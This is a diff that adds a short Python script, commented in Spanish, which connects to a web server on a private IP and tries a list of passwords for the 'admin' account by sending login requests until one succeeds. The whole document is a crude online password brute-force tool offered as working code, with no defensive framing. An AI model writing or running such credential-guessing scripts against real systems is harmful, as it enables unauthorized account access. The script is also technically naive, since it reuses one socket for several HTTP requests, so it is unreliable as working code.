@@ -1,0 +1,22 @@
+import socket
+
+target_ip = '192.168.1.100'
+target_port = 80
+username = 'admin'
+password_list = ['password1', 'password2', 'password3']
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+
+for password in password_list:
+    # Enviar solicitud de inicio de sesión con contraseña actual
+    login_request = f"GET /login?username={username}&password={password} HTTP/1.1\r\n\r\n"
+    s.send(login_request.encode())
+
+    # Recibir respuesta del servidor
+    response = s.recv(1024)
+    if 'Login successful' in response.decode():
+        print(f"Contraseña correcta: {password}")
+        break
+
+s.close()
